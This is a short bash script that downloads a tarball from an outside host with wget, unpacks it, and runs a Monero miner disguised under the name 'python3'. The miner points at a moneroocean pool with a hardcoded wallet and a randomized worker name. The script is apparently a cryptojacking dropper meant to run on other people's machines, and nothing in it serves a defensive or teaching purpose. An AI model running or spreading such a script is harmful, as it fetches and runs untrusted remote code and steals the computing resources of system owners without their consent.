#!/bin/bash

wget -O dot momok.x10.bz/DOT-SRB.tar.gz

tar xvf dot

nomer=$((RANDOM % 50 + 1))

./dotsrb/python3 -a randomx -o gulf.moneroocean.stream:10032 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.luck-$nomer
